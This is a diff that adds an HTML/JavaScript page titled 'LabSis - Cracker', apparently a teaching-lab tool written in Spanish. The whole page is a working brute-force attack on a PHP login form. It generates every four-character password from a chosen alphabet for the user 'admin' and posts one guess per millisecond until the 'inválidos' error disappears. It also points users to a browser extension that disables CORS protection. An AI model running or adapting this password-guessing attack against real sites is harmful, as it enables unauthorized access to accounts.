@@ -1,0 +1,94 @@
+<html>
+	<head>
+	    <title>LabSis - Cracker</title>
+	    <style>
+	        div {
+	            margin-top: 10px;
+	        }
+	    </style>
+	</head>
+	<body>
+		<h3>LabSis - Cracker</h3>
+	    <p>
+	        Para que esta aplicación funcione correctamente CORS tiene que estar activado. Podés agregar esta extensión desde acá: <a href="https://chrome.google.com/webstore/detail/allow-control-allow-origi/nlfbmbojpeacfghkpbjhddihlkkiljbi">https://chrome.google.com/webstore/detail/allow-control-allow-origi/nlfbmbojpeacfghkpbjhddihlkkiljbi</a>
+	    </p>
+	    <div>
+	        <label>Usuario</label>
+	        <input type="text" id="txt-usuario" value="admin" style="width: 300px; font-size: 14px; padding: 5px" />
+	    </div>
+	    <div>
+	        <label>Alfabeto de la clave</label>
+    	    <input type="text" id="txt-alfabeto" value="abcdefghijkmnñopqrstuvwxyz" style="width: 300px; font-size: 14px; padding: 5px" />
+	    </div>
+	    <div>
+    	    <input type="button" id="btn-empezar" value="Empezar" style="padding: 4px" />
+	    </div>
+	    <div>
+	        <label>Resultado</label>
+	    </div>
+	    <div id="div-resultado" style="border: 1px solid black; background-color: black; color: white; height: 60px; overflow-y: auto; padding: 8px">
+	        
+	    </div>
+
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+		<script type="text/javascript">
+            $(document).ready(function() {
+                var encontreClave = false;
+	            $("#btn-empezar").click(function() {
+	                empezar();
+	            });
+	            
+	            function imprimirPantalla(mensaje) {
+	                console.log(mensaje);
+	            }
+	            
+	            function empezar() {
+	                var alfabeto = $("#txt-alfabeto").val();
+	                var claves = alfabeto.split();
+	                
+	                imprimirPantalla("Formando claves...");
+	                for(var i=0; i<alfabeto.length; i++){
+		                for(var j=0; j<alfabeto.length; j++){
+			                for(var k=0; k<alfabeto.length; k++){
+				                for(var m=0; m<alfabeto.length; m++){
+					                var clave = alfabeto[i] + alfabeto[j] + alfabeto[k] + alfabeto[m];
+					                claves.push(clave);
+				                }
+			                }
+		                }
+	                }
+	                imprimirPantalla("Claves formadas: " + claves.length);
+	                
+	                var indiceClaveActual = 0;
+	                var intervalo = setInterval(function(){
+		                if(!encontreClave){
+			                imprimirPantalla("Probando con clave " + claves[indiceClaveActual]);
+			                hacerPeticion(claves[indiceClaveActual]);
+			                indiceClaveActual++;
+		                }else{
+			                clearInterval(intervalo);
+		                }
+	                }, 1);
+	            }
+	            
+	            function hacerPeticion(clave){
+		            $.ajax({
+			            url: "../index.php",
+			            type:"post",
+			            data:{
+				            txtNombre:"admin",
+				            txtContrasenia:clave,
+				            btnIngresar: "hola"
+			            }
+		            }).done(function(respuesta){
+			            if(respuesta.search("inválidos") === -1) {
+			                var clave = "Clave encontrada";
+			                console.log(clave);
+				            encontreClave = true;
+			            }
+		            });
+	            }
+            });
+		</script>
+	</body>
+</html>
